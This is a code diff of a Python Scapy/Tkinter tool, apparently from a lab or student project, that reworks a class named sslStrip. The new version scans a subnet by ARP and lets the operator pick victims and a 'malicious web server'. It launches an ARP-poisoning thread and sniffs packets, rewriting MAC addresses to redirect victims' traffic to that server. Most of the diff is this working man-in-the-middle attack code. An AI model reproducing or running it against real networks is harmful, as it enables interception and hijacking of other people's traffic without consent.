@@ -1,220 +1,185 @@
 from scapy.all import *
-from dnsarp import dnsarp
+from poison import poison
 import threading
 from Tkinter import*
 import sys
 import os
+from scapy.all import *
+from scapy.layers.inet import IP
+from scapy.layers.inet import TCP
+import threading
+import time
+#import requests
+import netifaces
+from math import log
+
+
+
 
 class sslStrip():
-    
     def __init__(self, interface, root):
         self.interface = interface
         self.root = root
         
-    def multiple_url(self):
+    def selMalWebSrv(self):
+        self.maliciousWebServer = []
         for widget in self.root.winfo_children():
             widget.destroy()
-        Label(self.root, text='Please enter the URLs of websites. For example, facebook.com ').pack()
-        scroll = Scrollbar(self.root)
-        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
-        scroll.config(command=self.eula.yview)
-        self.eula.pack()
-        def get_multiple(self):
-            self.full_list=[]
-            self.line_list = self.eula.get('1.0', 'end').split('\n')
-            for self.line in self.line_list:
-                self.full_list.append(self.line)
-            for self.line in self.full_list:
-                if self.line != '':
-                    self.url.append(self.line)
-            self.ownMAC = get_if_hwaddr(self.interface)
-            self.startProcess()
-        def restart_program(self):
-            python =sys.executable
-            os.execl(python, python, * sys.argv)
-        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
-        Button(self.root, text="Submit", command=lambda: get_multiple(self)).pack()
-        
-    def url_y_n(self):
-        for widget in self.root.winfo_children():
-            widget.destroy()
+        OPTIONS = []
+        for pktSnd, pktRcv in self.usedIPs:
+            OPTIONS.append(pktRcv[ARP].psrc)
+        Label(self.root, text='Select the WebServer').pack()
+        selectTargetIP = Listbox(self.root, selectmode="single", width=50)
+        for each_item in range(len(OPTIONS)):
+            selectTargetIP.insert(END, OPTIONS[each_item])
+        selectTargetIP.pack()
 
-        def set_y_n(self, s):
-            input_choice = s
-            #url contains all urls to redirect to the ip address specified above
-            self.url = []
-            if (input_choice == "y"):
-                self.multiple_url()
-            else:
-            #get own MAC address
-                self.ownMAC = get_if_hwaddr(self.interface)
-                self.startProcess()
+        def get_target(self):
+            for i in selectTargetIP.curselection():
+                InIpArp = int(i)
+                self.maliciousWebServer.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
+            self.myMAC = get_if_hwaddr(self.interface)
+            proc_thread = None
+            proc_thread = threading.Thread(target=self.startProcess)
+            proc_thread.daemon = True
+            proc_thread.start()
 
         def restart_program(self):
             python =sys.executable
             os.execl(python, python, * sys.argv)
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
 
-        Label(self.root, text='Do you want to selects URLs to redirect manually?').pack()
-        Button(self.root, text="Yes", command=lambda: set_y_n(self, "y")).pack()
-        Button(self.root, text="No", command=lambda: set_y_n(self, "n")).pack()
-        
-        
-    def website_ip(self):
-        for widget in self.root.winfo_children():
-            widget.destroy()
-        ipLabel = Label(self.root,
-                        text='Enter the ip address of the website to where the user should be redirected:').pack()
-        ipValue = Entry(self.root)
-        ipValue.pack()
+        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()
 
-        def get_execute(self):
-            self.ip_website = ipValue.get()
-            for widget in self.root.winfo_children():
-                widget.destroy()
-            self.url_y_n()
-
-        def restart_program(self):
-            python =sys.executable
-            os.execl(python, python, * sys.argv)
-        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
-        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()        
-        
-        
-    def select_target(self):
-        for widget in self.root.winfo_children():
-            widget.destroy()
-            
+    def select_arp_IP(self):
         self.target = []
-        Label(self.root, text='Select the target IP').pack()
+        Label(self.root, text='Select the victim/victims').pack()
         OPTIONS = []
-        for packet_sent, packet_received in self.ips_used:
-            OPTIONS.append(packet_received[ARP].psrc)
+        for pktSnd, pktRcv in self.usedIPs:
+            OPTIONS.append(pktRcv[ARP].psrc)
 
-        select = Listbox(self.root, selectmode="multiple", width=100)
+        select = Listbox(self.root, selectmode="multiple", width=50)
         for each_item in range(len(OPTIONS)):
             select.insert(END, OPTIONS[each_item])
         select.pack()
-        
-        def get_select(self):
+
+        def selectIpArp(self):
             for i in select.curselection():
-                inputInt = int(i)
+                InIpArp = int(i)
                 self.target.append(
-                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
-            self.website_ip()
-
-        def restart_program(self):
-            python =sys.executable
-            os.execl(python, python, * sys.argv)
-            
-        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
-        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()
-        
-        
-    def get_gateway(self):
-        #now we will select the default gateway
-        self.defaultGateway = []
-        Label(self.root, text='Select one IP of the default gateway').pack()
-        OPTIONS = []
-        for packet_sent, packet_received in self.ips_used:
-            OPTIONS.append(packet_received[ARP].psrc)
-
-        select = Listbox(self.root, selectmode="single", width=100)
-        for each_item in range(len(OPTIONS)):
-            select.insert(END, OPTIONS[each_item])
-        select.pack()
-
-        def get_select(self):
-            for i in select.curselection():
-                inputInt = int(i)
-                self.defaultGateway.append(
-                    {"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
-            self.select_target()
+                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
+            self.selMalWebSrv()
 
         def restart_program(self):
             python =sys.executable
             os.execl(python, python, * sys.argv)
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
 
-        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()
+        Button(self.root, text="Execute", command=lambda:selectIpArp(self)).pack()
 
-    def get_IP(self):
+    def getInput(self):
         ipLabel = Label(self.root,
-            text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
+                        text='Enter the range of IPs (i.e.: 10.0.2.0/24)').pack()
         ipValue = Entry(self.root)
         ipValue.pack()
-        
+
         def get_execute(self):
-            self.ip_range = ipValue.get()
-            self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.ip_range), timeout=3,
-                                   iface=self.interface)
+            self.rangeIPs = ipValue.get()
+            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,iface=self.interface)
             for widget in self.root.winfo_children():
                 widget.destroy()
-            self.get_gateway()
+            self.select_arp_IP()
 
         def restart_program(self):
             python =sys.executable
             os.execl(python, python, * sys.argv)
         Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
         Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()
-    
-    
-    def getInput(self):
-        self.get_IP()
-        
 
     def startProcess(self):
-        arpprocess = dnsarp(self.interface)
-        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y", "loud")
-        proc_thread = None
-        proc_thread = threading.Thread(target=arpprocess.startProcess)
-        proc_thread.daemon = True
-        proc_thread.start()
         for widget in self.root.winfo_children():
             widget.destroy()
-      
-        scroll = Scrollbar(self.root)
+        self.initShow()
         def restart_program(self):
             python =sys.executable
             os.execl(python, python, * sys.argv)
-        self.re = Button(self.root, text="Reset", command=lambda:restart_program(self))
-        self.re.pack(side=BOTTOM)
-        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
-        scroll.config(command=self.eula.yview)
-        self.eula.pack()
-        self.eula.insert(END, "DNS sniffing has started" + '\n')
-        self.eula.see(END)
-        self.eula.update_idletasks()
+        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
+
+        self.initThread()
         while True:
-            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
+            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)
 
-    #method which does the DNS spoofing of a packet
-    def doSpoofing(self, packet):
-        self.root.update()
-        #checks whether it is a correct packet
-        if packet.haslayer(Ether) and packet.haslayer(IP):
-            try:
-                if(packet[Ether].src == self.defaultGateway[0]["mac"]):
-                    packet[Ether].src = packet[Ether].dst
-                    for tar in self.target:
-                        if tar["ip"] == packet[IP].dst:
-                            packet[Ether].dst = tar["mac"]
-                    sendp(packet, iface=self.interface, verbose=False)
-                else:
-                    for tar in self.target:
-                        if tar["mac"] == packet[Ether].src:
-                            packet[Ether].src = self.ownMAC
-                            packet[Ether].dst = self.defaultGateway[0]["mac"]
-                            sendp(packet, iface=self.interface, verbose=False)
-            except:
-                print("Disaster")
-                
-            
+    def initShow(self):
+        scroll = Scrollbar(self.root)
+        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
+        scroll.config(command=self.show.yview)
+        self.show.pack()
+        self.show.see(END)
+        self.show.update_idletasks()
 
-                
-            
-               
-            
+    def initThread(self):
+        proc_thread = None
+        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
+        proc_thread = threading.Thread(target=process.poison)
+        proc_thread.daemon = True
+        proc_thread.start()
 
-                
-            
+    def packetForwarding(self, packet):
+        if packet.haslayer(Ether) and packet.haslayer(IP):#check IP&Arp Layer
+            self.show.insert(END, "from ip: {},mac from: {} to ip: {}, ip gateway{}, mac gateway{}".format(packet[IP].dst, packet[Ether].dst, packet[IP].src, self.maliciousWebServer[0]["ip"],self.maliciousWebServer[0]["mac"]) + '\n')
+            self.show.insert(END, "to ip: {}, ip gateway{}, mac gateway{}".format(packet[IP].src, self.maliciousWebServer[0]["ip"],self.maliciousWebServer[0]["mac"]) + '\n')
+            self.show.insert(END,'\n')                                                                    
+            self.show.see(END)
+            self.show.update_idletasks()
+            sender= None
+            senderfound = False
+            receiver = None
+            receiverfound = False
+            for vict in self.target:
+                if (vict["mac"] == packet[Ether].src):
+                    sender, senderfound = self.SndFound(vict)
+                    if ('192.168.0.1' == packet[IP].dst):
+                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
+                        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(packet[IP].dst, packet[Ether].dst) + '\n')
+                        self.show.insert(END,'\n')                                                                    
+                        self.show.see(END)
+                        self.show.update_idletasks()
+            if ((not senderfound) or (not receiverfound)):
+                if ('08:00:27:0b:33:f8'== packet[Ether].src):
+                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
+                    for vict in self.target:
+                        if (vict["ip"] == packet[IP].dst):
+                            receiver, receiverfound = self.rcvFound(vict)
+                            self.show.insert(END, "Redirect from ip: {}, mac: {}".format(packet[IP].dst, packet[Ether].dst) + '\n')
+                            self.show.insert(END,'\n')                                                                    
+                            self.show.see(END)
+                            self.show.update_idletasks()
+            if (senderfound and receiverfound):
+                self.modifyAndSend(packet, sender, receiver)
+
+    def rcvFound(self, subj):
+        receiver = subj
+        receiverfound = True
+        return receiver,receiverfound
+
+    def SndFound(self, subj):
+        sender = subj
+        senderfound = True
+        return sender,senderfound
+
+    def modifyAndSend(self, packet, sender, receiver):
+        packet[Ether].src = self.myMAC
+        packet[Ether].dst = receiver["mac"]
+        sendp(packet, iface=self.interface, verbose=False)
+        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
+        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
+        self.show.insert(END,'\n')                                                                    
+        self.show.see(END)
+        self.show.update_idletasks()
+
+    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
+        self.rangeIPs = rangeIPs
+        self.usedIPs = usedIPs
+        self.target = target
+        self.maliciousWebServer = maliciousWebServer
+        self.myMAC = myMAC
